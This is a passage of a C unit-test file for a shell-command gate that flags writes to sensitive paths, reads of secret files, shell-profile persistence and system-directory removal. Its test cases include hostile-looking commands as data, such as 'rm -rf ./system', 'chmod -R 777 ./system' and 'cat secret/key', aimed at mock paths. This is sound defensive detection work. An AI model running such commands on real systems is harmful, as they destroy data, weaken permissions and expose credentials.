      (test_case->detail_contains &&
       (!violation->detail ||
        !strstr(violation->detail, test_case->detail_contains)))) {
    printf("    case %s produced an incomplete violation record\n",
           test_case->name);
    return false;
  }

  if (test_case->benign) {
    if (eval_cmd(gate, test_case->benign, &result) != SG_OK ||
        !violation_result_is_consistent(&result) ||
        (result.violation_type_flags & test_case->flag)) {
      printf("    benign counterpart for %s produced a false positive\n",
             test_case->name);
      return false;
    }
  }
  return true;
}

TEST(file_identity_violation_paths) {
  static const struct {
    const char *cwd;
    const char *command;
    uint32_t flag;
    bool expected;
  } cases[] = {
      {"/workspace", "printf x >sensitive", SG_VIOL_WRITE_SENSITIVE, true},
      {"/workspace", "\"$tool\" >sensitive; printf x >after",
       SG_VIOL_WRITE_SENSITIVE, true},
      {"/workspace", "command \"$tool\" >sensitive", SG_VIOL_WRITE_SENSITIVE,
       true},
      {"/workspace", "time \"$tool\" >sensitive", SG_VIOL_WRITE_SENSITIVE,
       true},
      {"/workspace", "{ \"$tool\" >sensitive; }", SG_VIOL_WRITE_SENSITIVE,
       true},
      {"/workspace", "cd /workspace; printf x >./sensitive",
       SG_VIOL_WRITE_SENSITIVE, true},
      {"/workspace", "cd /workspace/other; printf x >sensitive",
       SG_VIOL_WRITE_SENSITIVE, false},
      {"/workspace/other", "cd /workspace 2>&1 && printf x >sensitive",
       SG_VIOL_WRITE_SENSITIVE, true},
      {"/workspace/other", "cd 2>& 1 /workspace && printf x >sensitive",
       SG_VIOL_WRITE_SENSITIVE, true},
      {"/workspace/other", "cd /workspace 2>&1; printf x >sensitive",
       SG_VIOL_WRITE_SENSITIVE, false},
      {"/workspace", "time -p cd / 2>&1; printf x >sensitive",
       SG_VIOL_WRITE_SENSITIVE, false},
      {"/workspace", "cd --invalid || printf x >sensitive",
       SG_VIOL_WRITE_SENSITIVE, true},
      {"/workspace", "( cd /workspace; printf x >sensitive )",
       SG_VIOL_WRITE_SENSITIVE, true},
      {"/workspace", "{ cd /workspace; printf x >sensitive; } &",
       SG_VIOL_WRITE_SENSITIVE, true},
      {"/workspace", "( : | cd /tmp; printf x >sensitive )",
       SG_VIOL_WRITE_SENSITIVE, true},
      {"/workspace", "cd /tmp <<<body | :; printf x >sensitive",
       SG_VIOL_WRITE_SENSITIVE, true},
      {"/workspace", "cd \"$value\"; printf x >sensitive",
       SG_VIOL_WRITE_SENSITIVE, false},
      {"/workspace", "printf x >\"$value\"", SG_VIOL_WRITE_SENSITIVE, false},
      {"/workspace", "printf x >/workspace/sensitive-other",
       SG_VIOL_WRITE_SENSITIVE, false},
      {"/workspace", "printf x >$'/workspace/./sensitive'",
       SG_VIOL_WRITE_SENSITIVE, true},
      {"/workspace", "printf x >/workspace/link/../sensitive",
       SG_VIOL_WRITE_SENSITIVE, false},
      {".", "printf x >sensitive", SG_VIOL_WRITE_SENSITIVE, false},
      {"/workspace", "echo \"$(cat ./sensitive)\"", SG_VIOL_SUBST_SENSITIVE,
       true},
      {"/workspace", "echo \"$(<sensitive)\"", SG_VIOL_SUBST_SENSITIVE, true},
      {"/workspace", "command \"$tool\" \"$(<sensitive)\" >out",
       SG_VIOL_SUBST_SENSITIVE, true},
      {"/workspace", "\"$tool\"; echo \"$(<sensitive)\"",
       SG_VIOL_SUBST_SENSITIVE, false},
      {"/workspace", "echo \"$(cd /tmp; cat ./sensitive)\"",
       SG_VIOL_SUBST_SENSITIVE, false},
      {"/workspace", "cat secret/key", SG_VIOL_READ_SECRETS, true},
      {"/workspace/secret", "cat ./key", SG_VIOL_READ_SECRETS, true},
      {"/workspace/other", "cat ./key", SG_VIOL_READ_SECRETS, false},
      {"/workspace/profile", "printf x >rc", SG_VIOL_PERSISTENCE, true},
      {"/workspace/other", "printf x >rc", SG_VIOL_PERSISTENCE, false},
      {"/workspace", "rm -rf ./system", SG_VIOL_REMOVE_SYSTEM, true},
      {"/workspace", "chmod -R 777 ./system", SG_VIOL_PERM_SYSTEM, true},
      {"/workspace", "rm -rf ./system-other", SG_VIOL_REMOVE_SYSTEM, false},
      {"/workspace", "( : | cd /tmp; printf x >out ); cat /workspace/out",
       SG_VIOL_WRITE_THEN_READ, true},
      {"/workspace", "( : | cd /tmp; printf x >out ); cat /tmp/out",
       SG_VIOL_WRITE_THEN_READ, false},
      {"/workspace", "cd /tmp <<<body | :; printf x >out; cat /workspace/out",
       SG_VIOL_WRITE_THEN_READ, true},
  };
  static const char *const rules[] = {"printf *", "echo *", "cat *",  "cd *",
                                      ":",        "rm *",   "chmod *"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_write_paths[0] = "/workspace/sensitive";
  config.sensitive_write_path_count = 1;
  config.sensitive_read_paths[0] = "/workspace/sensitive";
  config.sensitive_read_path_count = 1;
  config.sensitive_secret_paths[0] = "/workspace/secret";
  config.sensitive_secret_path_count = 1;
  config.shell_profile_paths[0] = "/workspace/profile";
  config.shell_profile_path_count = 1;
  config.sensitive_dirs[0] = "/workspace/system";
  config.sensitive_dir_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    ASSERT_SG_OK(sg_gate_set_cwd(gate, cases[i].cwd));
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[i].command, &result));
    bool found = (result.violation_type_flags & cases[i].flag) != 0;
    if (found != cases[i].expected)
      printf("\n    identity case %zu: %s (flags=%u)\n", i, cases[i].command,
             result.violation_type_flags);
    ASSERT(found == cases[i].expected);
    ASSERT(violation_result_is_consistent(&result));
  }
  /* Relative configured prefixes remain source-spelling rules, not paths
   * anchored to the gate's initial directory. Empty entries match nothing. */
  config.sensitive_write_paths[0] = "relative";
  config.sensitive_write_paths[1] = "";
  config.sensitive_write_path_count = 2;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  ASSERT_SG_OK(sg_gate_set_cwd(gate, "/workspace"));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "printf x >relative/child", &result));
  ASSERT((result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) != 0);
  ASSERT_SG_OK(eval_cmd(gate, "printf x >/workspace/relative/child", &result));
  ASSERT((result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) == 0);
  sg_gate_free(gate);
}

TEST(path_fragment_match_matrix) {
  static const struct {
    const char *cwd;
    const char *command;
    const char *fragment;
    uint32_t expected;
  } cases[] = {
      {"/workspace", "printf x >/tmp/abababac", "ababac", SG_VIOL_PERSISTENCE},
      {"/workspace", "printf x >/tmp/abababab", "ababac", 0},
      {"/workspace", "printf x >/tmp/aa", "aaaa", 0},
      {"/workspace", "printf x >/tmp/abc", "", 0},
      {"/workspace", "cat /tmp/se\"cret\"", "secret", SG_VIOL_READ_SECRETS},
      {"/workspace", "cat /tmp/secret", "/tmp/secret", SG_VIOL_READ_SECRETS},
      {"/workspace", "cat /tmp/sec\\ ret", "sec ret", SG_VIOL_READ_SECRETS},
      {"/workspace", "printf x >$'/tmp/a\\x62abac'", "abac",
       SG_VIOL_PERSISTENCE},
      {"/workspace", "printf x >$'/tmp/caf\\xc3\\xa9'", "caf\xc3\xa9",
       SG_VIOL_PERSISTENCE},
      /* NUL truncates only its ANSI-C fragment; later fragments resume.
       * Each row installs its matching configuration before evaluation. */
      {"/workspace", "printf x >/tmp/secret", "secret", SG_VIOL_PERSISTENCE},
      {"/workspace", "printf x >$'/tmp/secret\\0ignored'", "secret",
       SG_VIOL_PERSISTENCE},
      {"/workspace", "printf x >$'/tmp/\\0secret'", "secret", 0},
      {"/workspace", "printf x >$'/tmp/\\0ignored'secret", "secret",
       SG_VIOL_PERSISTENCE},
      {"/workspace", "cat /tmp/secret", "secret", SG_VIOL_READ_SECRETS},
      {"/workspace", "cat $'/tmp/secret\\0ignored'", "secret",
       SG_VIOL_READ_SECRETS},
      {"/workspace", "cat $'/tmp/\\0secret'", "secret", 0},
      {"/workspace", "cat $'/tmp/\\0ignored'secret", "secret",
       SG_VIOL_READ_SECRETS},
      {"/workspace", "printf x >rc", "/workspace/rc", SG_VIOL_PERSISTENCE},
      {".", "printf x >workspace/rc", "/workspace/rc", 0},
      {"/workspace", "printf x >./profile", "./profile", SG_VIOL_PERSISTENCE},
      {"/workspace", "printf x >/tmp/./profile", "/tmp/./profile", 0},
      {"/workspace", "cd \"$where\"; printf x >./profile", "./profile",
       SG_VIOL_PERSISTENCE},
      {"/workspace", "cd \"$where\"; cat /tmp/secret", "/tmp/secret",
       SG_VIOL_READ_SECRETS},
      {"/workspace", "printf x >\"$where/secret\"", "secret",
       SG_VIOL_PERSISTENCE},
  };
  static const char *const rules[] = {"printf *", "cat *", "cd *"};
  sg_gate_t *gate = gate_with_rules(rules, 3);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  sg_violation_config_t config = {0};
  config.redirect_fanout_threshold = UINT32_MAX;
  config.file_reading_cmds[0] = "cat";
  config.file_reading_cmd_count = 1;
  config.sensitive_secret_path_count = config.shell_profile_path_count = 2;
  config.sensitive_secret_paths[0] = config.shell_profile_paths[0] = "";
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    ASSERT_SG_OK(sg_gate_set_cwd(gate, cases[i].cwd));
    config.sensitive_secret_paths[1] = config.shell_profile_paths[1] =
        cases[i].fragment;
    ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
    sg_result_t result;
    sg_error_t status = eval_cmd(gate, cases[i].command, &result);
    if (status != SG_OK)
      printf("\n    fragment case %zu: %s (status=%d)\n", i, cases[i].command,
             status);
    ASSERT_SG_OK(status);
    if (result.violation_type_flags != cases[i].expected)
      printf("\n    fragment case %zu: %s (flags=%u)\n", i, cases[i].command,
             result.violation_type_flags);
    ASSERT_EQ_UINT(result.violation_type_flags, cases[i].expected);
  }
  /* All 255 non-NUL bytes can be fragment alphabet classes; high bytes and
   * the last biased class must not be truncated or confused with class 0. */
  char alphabet[256], source[1100];
  size_t used = (size_t)snprintf(source, sizeof(source), "printf x >$'");
  for (unsigned byte = 1; byte <= 255; byte++) {
    alphabet[byte - 1] = (char)byte;
    int written =
        snprintf(source + used, sizeof(source) - used, "\\x%02x", byte);
    ASSERT(written == 4);
    used += (size_t)written;
  }
  alphabet[255] = '\0';
  source[used++] = '\'';
  source[used] = '\0';
  config.sensitive_secret_paths[1] = config.shell_profile_paths[1] = alphabet;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, source, &result));
  ASSERT_EQ_UINT(result.violation_type_flags, SG_VIOL_PERSISTENCE);

  sg_gate_free(gate);
}

TEST(path_fragment_linear_work) {
  static const char *const rules[] = {"printf *"};
  sg_gate_t *gate = gate_with_rules(rules, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  sg_violation_config_t config = {0};
  config.redirect_fanout_threshold = UINT32_MAX;
  char fragments[2][258], word[2050], command[2100];
  unsigned round = 0;
  size_t previous[2] = {0};
  for (size_t prefix = 32; prefix <= 256; prefix *= 2) {
    /* Never mutate an installed configuration's borrowed spelling. */
    char *fragment = fragments[round++ % 2];
    memset(fragment, 'a', prefix);
    fragment[prefix] = 'b';
    fragment[prefix + 1] = '\0';
    size_t word_length = prefix * 8;
    memset(word, 'a', word_length);
    word[word_length] = 'c';
    word[word_length + 1] = '\0';
    for (unsigned dynamic = 0; dynamic < 2; dynamic++) {
      snprintf(command, sizeof(command), "printf x >\"%s/%s\"",
               dynamic ? "$where" : "/tmp", word);
      config.shell_profile_paths[0] = fragment;
      config.shell_profile_path_count = 1;
      ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
      sg_test_path_work_reset();
      sg_result_t result;
      ASSERT_SG_OK(eval_cmd(gate, command, &result));
      ASSERT_EQ_UINT(result.violation_type_flags, 0);
      size_t decoded_once = sg_test_path_decoded_count();
      ASSERT(decoded_once > word_length && decoded_once < 3 * strlen(command));

      /* More rules must not cause any additional source-word decoding. */
      for (uint32_t i = 0; i < SG_VIOL_MAX_PATHS; i++)
        config.shell_profile_paths[i] = fragment;
      config.shell_profile_path_count = SG_VIOL_MAX_PATHS;
      sg_test_path_work_reset();
      ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
      ASSERT(sg_test_path_work_count() <= 3 * SG_VIOL_MAX_PATHS * (prefix + 1));
      sg_test_path_work_reset();
      sg_test_alloc_fail_at(1);
      sg_error_t status = eval_cmd(gate, command, &result);
      size_t allocations = sg_test_alloc_count();
      sg_test_alloc_reset();
      ASSERT_SG_OK(status);
      ASSERT_EQ_UINT(allocations, 0);
      ASSERT_EQ_UINT(result.violation_type_flags, 0);
      ASSERT_EQ_UINT(sg_test_path_decoded_count(), decoded_once);
      size_t work = sg_test_path_work_count();
      ASSERT(work > 0 && work <= 6 * SG_VIOL_MAX_PATHS * strlen(command));
      if (previous[dynamic] != 0)
        ASSERT(work < 3 * previous[dynamic]);
      previous[dynamic] = work;
    }
  }
  sg_gate_free(gate);
}

TEST(path_fragment_configuration_atomicity) {
  static const char *const rules[] = {"printf *"};
  sg_gate_t *gate = gate_with_rules(rules, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_violation_config_t config = {0};
  config.redirect_fanout_threshold = UINT32_MAX;
  char *old_fragment = strdup("old.rc");
  char *new_fragment = strdup("new.rc");
  ASSERT(old_fragment != NULL && new_fragment != NULL);
  config.shell_profile_paths[0] = old_fragment;
  config.shell_profile_path_count = 1;
  sg_test_alloc_fail_at(1);
  sg_error_t status = sg_gate_set_violation_config_borrowed(gate, &config);
  sg_test_alloc_reset();
  ASSERT_EQ_INT(status, SG_ERR_MEMORY);
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "printf x >/tmp/old.rc", &result));
  ASSERT_EQ_UINT(result.violation_type_flags, 0);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));

  config.shell_profile_paths[0] = new_fragment;
  sg_test_alloc_fail_at(1);
  status = sg_gate_set_violation_config_borrowed(gate, &config);
  sg_test_alloc_reset();
  ASSERT_EQ_INT(status, SG_ERR_MEMORY);
  ASSERT_SG_OK(eval_cmd(gate, "printf x >/tmp/old.rc", &result));
  ASSERT_EQ_UINT(result.violation_type_flags, SG_VIOL_PERSISTENCE);
  ASSERT_SG_OK(eval_cmd(gate, "printf x >/tmp/new.rc", &result));
  ASSERT_EQ_UINT(result.violation_type_flags, 0);

  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  free(old_fragment); /* Its borrowed lifetime ended at successful replacement.
                       */
  ASSERT_SG_OK(eval_cmd(gate, "printf x >/tmp/old.rc", &result));
  ASSERT_EQ_UINT(result.violation_type_flags, 0);
  ASSERT_SG_OK(eval_cmd(gate, "printf x >/tmp/new.rc", &result));
  ASSERT_EQ_UINT(result.violation_type_flags, SG_VIOL_PERSISTENCE);

  config.shell_profile_paths[0] = "";
  sg_test_alloc_fail_at(1);
  status = sg_gate_set_violation_config_borrowed(gate, &config);
  size_t allocations = sg_test_alloc_count();
  sg_test_alloc_reset();
  ASSERT_SG_OK(status);
  ASSERT_EQ_UINT(allocations, 0);
  free(new_fragment);
  ASSERT_SG_OK(eval_cmd(gate, "printf x >/tmp/new.rc", &result));
  ASSERT_EQ_UINT(result.violation_type_flags, 0);
  sg_gate_free(gate);
}

TEST(file_identity_index_contract) {
  static const char *const rules[] = {"printf *", "cat *"};
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  ASSERT_SG_OK(sg_gate_set_cwd(gate, "/workspace"));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_write_paths[0] = "/never-sensitive-write";
  config.sensitive_write_path_count = 1;
  config.sensitive_dirs[0] = "/never-sensitive-dir";
  config.sensitive_dir_count = 1;
  config.sensitive_read_paths[0] = "/never-sensitive-read";
  config.sensitive_read_path_count = 1;
  config.shell_profile_paths[0] = "never-profile";
  config.shell_profile_path_count = 1;
  config.sensitive_secret_paths[0] = "never-secret";
  config.sensitive_secret_path_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));

  static const struct {
    const char *command;
    bool same_identity;
  } identity_cases[] = {
      {"printf x >/tmp/shared/./target; cat /tmp/shared/target", true},
      {"printf x >/tmp/shared//target; cat /tmp/shared/target", true},
      {"printf x >/tmp/common-prefix; cat /tmp/common-prefix-long", false},
      {"printf x >/tmp/common-prefix-long; cat /tmp/common-prefix", false},
      {"printf x >/tmp/common-prefix-a; cat /tmp/common-prefix-b", false},
  };
  for (size_t i = 0; i < sizeof(identity_cases) / sizeof(identity_cases[0]);
       i++) {
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, identity_cases[i].command, &result));
    bool found = (result.violation_type_flags & SG_VIOL_WRITE_THEN_READ) != 0;
    ASSERT(found == identity_cases[i].same_identity);
  }

  /* Previously each short equivalent spelling decoded the first, longest
   * representative again. The total decode count therefore grew quadratically
   * even though the input was linear. Each FILE document is now decoded once
   * while exact normalized identities are interned in one pass. */
  size_t previous_input = 0, previous_decoded = 0;
  for (unsigned count = 4; count <= 32; count *= 2) {
    char path[1024], command[8192];
    size_t path_used = 0, command_used = 0;
    path[path_used++] = '/';
    for (unsigned i = 0; i < 4 * count; i++) {
      path[path_used++] = '.';
      path[path_used++] = '/';
    }
    path[path_used++] = 'x';
    path[path_used] = '\0';
    int written = snprintf(command, sizeof(command), "printf x >%s; ", path);
    ASSERT(written > 0 && (size_t)written < sizeof(command));
    command_used = (size_t)written;
    for (unsigned i = 1; i < count; i++) {
      written = snprintf(command + command_used, sizeof(command) - command_used,
                         "cat /x; ");
      ASSERT(written > 0 && (size_t)written < sizeof(command) - command_used);
      command_used += (size_t)written;
    }

    sg_test_path_work_reset();
    sg_test_alloc_fail_at(1);
    sg_result_t result;
    sg_error_t status = eval_cmd(gate, command, &result);
    size_t allocations = sg_test_alloc_count();
    sg_test_alloc_reset();
    ASSERT_SG_OK(status);
    ASSERT_EQ_UINT(allocations, 0);
    ASSERT_EQ_UINT(result.subcommand_count, count);
    ASSERT((result.violation_type_flags & SG_VIOL_WRITE_THEN_READ) != 0);
    size_t decoded = sg_test_path_decoded_count();
    ASSERT_EQ_UINT(decoded, path_used + 2 * (count - 1));
    if (previous_input != 0) {
      ASSERT(command_used < 3 * previous_input);
      ASSERT(decoded < 3 * previous_decoded);
    }
    previous_input = command_used;
    previous_decoded = decoded;
  }
  sg_gate_free(gate);
}

TEST(shared_cwd_path_index_contract) {
  static const char *const rules[] = {"printf *", "cat *", "cd *"};
  sg_gate_t *gate = gate_with_rules(rules, 3);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  static const struct {
    const char *cwd, *command, *prefix, *fragment;
    uint32_t expected;
  } cases[] = {
      {"/root/shared", "printf x >./target; cat /root/shared/target",
       "/root/shared/target", "/shared/target",
       SG_VIOL_WRITE_SENSITIVE | SG_VIOL_PERSISTENCE | SG_VIOL_READ_SECRETS |
           SG_VIOL_WRITE_THEN_READ},
      /* Absolute operands split incoming CWD trie labels. Cached CWD and
       * directory cursors must still name the same complete prefix. */
      {"/root/shared",
       "printf x >target; cat /root/share; cat /root/shared-more; cat ./target",
       "/root/shared/target", "/shared/target",
       SG_VIOL_WRITE_SENSITIVE | SG_VIOL_PERSISTENCE | SG_VIOL_READ_SECRETS |
           SG_VIOL_WRITE_THEN_READ},
      {"/root/shared", "printf x >./.; cat /root/shared", "/root/shared",
       "/shared",
       SG_VIOL_WRITE_SENSITIVE | SG_VIOL_PERSISTENCE | SG_VIOL_READ_SECRETS |
           SG_VIOL_WRITE_THEN_READ},
      {"/root/shared", "printf x >.; cat /root/shared", "/root/shared/", "",
       SG_VIOL_WRITE_THEN_READ},
      {"/root/shared", "printf x >child; cat ./child", "/root/shared/", "",
       SG_VIOL_WRITE_SENSITIVE | SG_VIOL_WRITE_THEN_READ},
      {"/root/shared", "printf x >target-more; cat ./target-more",
       "/root/shared/target", "/shared/target-end", SG_VIOL_WRITE_THEN_READ},
      {"/", "printf x >./target; cat /target", "/target", "/target",
       SG_VIOL_WRITE_SENSITIVE | SG_VIOL_PERSISTENCE | SG_VIOL_READ_SECRETS |
           SG_VIOL_WRITE_THEN_READ},
      {"workspace/shared", "printf x >./target; cat ./target",
       "/workspace/shared/target", "/shared/target", SG_VIOL_WRITE_THEN_READ},
      {".", "printf x >./target; cat ./target", "", "/target",
       SG_VIOL_WRITE_THEN_READ},
      {"", "printf x >./target; cat ./target", "", "/target",
       SG_VIOL_WRITE_THEN_READ},
      {"", "printf x >./.; cat ./.", "", "/", SG_VIOL_WRITE_THEN_READ},
      {"/root/shared",
       "(cd /root/other; printf x >./target; cat /root/other/target); "
       "printf x >target; cat /root/shared/target",
       "/root/shared/target", "/shared/target",
       SG_VIOL_WRITE_SENSITIVE | SG_VIOL_PERSISTENCE | SG_VIOL_READ_SECRETS |
           SG_VIOL_WRITE_THEN_READ},
  };
  sg_violation_config_t config = {0};
  config.redirect_fanout_threshold = UINT32_MAX;
  config.file_reading_cmds[0] = "cat";
  config.file_reading_cmd_count = 1;
  /* Exercise bit 31 and empty entries in both prefix and fragment lists. */
  config.sensitive_write_path_count = config.shell_profile_path_count =
      config.sensitive_secret_path_count = SG_VIOL_MAX_PATHS;
  for (uint32_t i = 0; i + 1 < SG_VIOL_MAX_PATHS; i++) {
    config.sensitive_write_paths[i] = "";
    config.shell_profile_paths[i] = config.sensitive_secret_paths[i] = "";
  }
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    config.sensitive_write_paths[SG_VIOL_MAX_PATHS - 1] = cases[i].prefix;
    config.shell_profile_paths[SG_VIOL_MAX_PATHS - 1] =
        config.sensitive_secret_paths[SG_VIOL_MAX_PATHS - 1] =
            cases[i].fragment;
    ASSERT_SG_OK(sg_gate_set_cwd(gate, cases[i].cwd));
    ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[i].command, &result));
    if (result.violation_type_flags != cases[i].expected)
      printf("\n    shared CWD case %zu: %s (flags=%u)\n", i, cases[i].command,
             result.violation_type_flags);
    ASSERT_EQ_UINT(result.violation_type_flags, cases[i].expected);
  }
  sg_gate_free(gate);
}

TEST(shared_cwd_path_linear_work) {
  static const char *const rules[] = {"printf *", "cat *", "cd *"};
  sg_gate_t *gate = gate_with_rules(rules, 3);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  sg_violation_config_t config = {0};
  config.redirect_fanout_threshold = UINT32_MAX;
  config.file_reading_cmds[0] = "cat";
  config.file_reading_cmd_count = 1;
  config.sensitive_write_path_count = config.sensitive_read_path_count =
      config.sensitive_dir_count = config.shell_profile_path_count =
          config.sensitive_secret_path_count = SG_VIOL_MAX_PATHS;
  char fragments[2][258], command[4096];
  unsigned round = 0;
  size_t previous_identity[2] = {0}, previous_match[2] = {0};
  size_t previous_normalize[2] = {0};
  for (unsigned count = 4; count <= 32; count *= 2) {
    char *fragment = fragments[round++ % 2];
    size_t cwd_length = 7 * count;
    fragment[0] = '/';
    memset(fragment + 1, 'a', cwd_length - 1);
    fragment[cwd_length] = 'z';
    fragment[cwd_length + 1] = '\0';
    for (uint32_t i = 0; i < SG_VIOL_MAX_PATHS; i++) {
      config.sensitive_write_paths[i] = config.sensitive_read_paths[i] =
          config.sensitive_dirs[i] = config.shell_profile_paths[i] =
              config.sensitive_secret_paths[i] = fragment;
    }
    ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
    for (unsigned distinct = 0; distinct < 2; distinct++) {
      int written = snprintf(command, sizeof(command), "cd %.*s && ",
                             (int)cwd_length, fragment);
      ASSERT(written > 0 && (size_t)written < sizeof(command));
      size_t used = (size_t)written;
      for (unsigned i = 0; i < count; i++) {
        written = snprintf(command + used, sizeof(command) - used,
                           "%s ./f%02u%s", i % 2 ? "cat" : "printf x >",
                           distinct ? i / 2 : 0, i + 1 == count ? "" : " && ");
        ASSERT(written > 0 && (size_t)written < sizeof(command) - used);
        used += (size_t)written;
      }
      sg_test_path_work_reset();
      shellsplit_test_source_scan_reset();
      sg_test_alloc_fail_at(1);
      sg_result_t result;
      sg_error_t status = eval_cmd(gate, command, &result);
      size_t allocations = sg_test_alloc_count();
      sg_test_alloc_reset();
      ASSERT_SG_OK(status);
      ASSERT_EQ_UINT(allocations, 0);
      ASSERT_EQ_UINT(result.subcommand_count, count + 1);
      ASSERT_EQ_UINT(result.violation_type_flags, SG_VIOL_WRITE_THEN_READ);
      /* Account for actual CWD measurement/copies, trie comparisons, lexical
       * normalization and predicate transitions, not just FILE decoding. The
       * shared CWD grows with the operand count while source size stays linear.
       */
      size_t identity = sg_test_path_identity_count();
      size_t match = sg_test_path_work_count();
      size_t normalize = shellsplit_test_metadata_work(
          SHELLSPLIT_TEST_WORK_PATH_NORMALIZATION);
      ASSERT_EQ_UINT(sg_test_path_decoded_count(), 5 * count + cwd_length);
      ASSERT(identity > 0 && identity < 8 * used);
      ASSERT(normalize > 0 && normalize < 8 * used);
      ASSERT(match > 0 && match < 6 * SG_VIOL_MAX_PATHS * used);
      if (previous_identity[distinct]) {
        ASSERT(identity < 3 * previous_identity[distinct]);
        ASSERT(match < 3 * previous_match[distinct]);
        ASSERT(normalize < 3 * previous_normalize[distinct]);
      }
      previous_identity[distinct] = identity;
      previous_match[distinct] = match;
      previous_normalize[distinct] = normalize;
    }
  }
  sg_gate_free(gate);
}

TEST(shared_cwd_fragment_branching_work) {
  sg_gate_t *gate = gate_with_rules((const char *[]){"printf *"}, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  sg_violation_config_t config = {0};
  config.redirect_fanout_threshold = UINT32_MAX;
  config.shell_profile_path_count = SG_VIOL_MAX_PATHS;
  char fragments[2][260], command[4096];
  static const char initials[] = "0123456789ABCDEFGHIJKLMNOPQRSTUV";
  size_t previous = 0;
  unsigned round = 0;
  for (unsigned count = 4; count <= 32; count *= 2) {
    char *fragment = fragments[round++ % 2];
    size_t length = 8 * count;
    fragment[0] = '/';
    for (size_t i = 1; i < length; i++)
      fragment[i] = i % 2 ? 'a' : '/';
    fragment[length] = '/';
    fragment[length + 1] = 'z';
    fragment[length + 2] = '\0';
    /* A periodic fragment has many borders at the cached CWD boundary.
     * Distinct first bytes fork that state, defeating KMP's amortization over
     * one uninterrupted stream unless transitions are compiled in advance. */
    for (uint32_t i = 0; i < SG_VIOL_MAX_PATHS; i++)
      config.shell_profile_paths[i] = fragment + 1;
    ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
    char cwd[260];
    memcpy(cwd, fragment, length);
    cwd[length] = '\0';
    ASSERT_SG_OK(sg_gate_set_cwd(gate, cwd));
    size_t used = 0;
    for (unsigned i = 0; i < count; i++) {
      int written = snprintf(command + used, sizeof(command) - used,
                             "printf x >./%c00; ", initials[i]);
      ASSERT(written > 0 && (size_t)written < sizeof(command) - used);
      used += (size_t)written;
    }
    sg_test_path_work_reset();
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, command, &result));
    ASSERT_EQ_UINT(result.violation_type_flags, 0);
    size_t work = sg_test_path_work_count();
    ASSERT(work > 0 && work < 4 * SG_VIOL_MAX_PATHS * (used + length));
    ASSERT(previous == 0 || work < 3 * previous);
    previous = work;
  }
  sg_gate_free(gate);
}

TEST(resolved_status_builtin_evaluation) {
  static const char *const rules[] = {
      "exec",
      "exit",
      "command false",
      "command false ignored",
      "builtin false ignored",
      "command -p false ignored",
      "builtin true",
      "true ignored",
      "command -p true ignored",
      "command : ignored",
      "builtin true ignored",
      "false ignored",
      "unset fd",
      "printf x",
  };
  static const char *const sources[] = {
      "false ignored &&",
      "command false &&",
      "builtin false ignored &&",
      "command -p false ignored &&",
      "builtin true ||",
      "true ignored ||",
      "command -p true ignored ||",
      "com'mand' : ignored ||",
      "! builtin true ignored &&",
      "! command false ignored ||",
  };
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
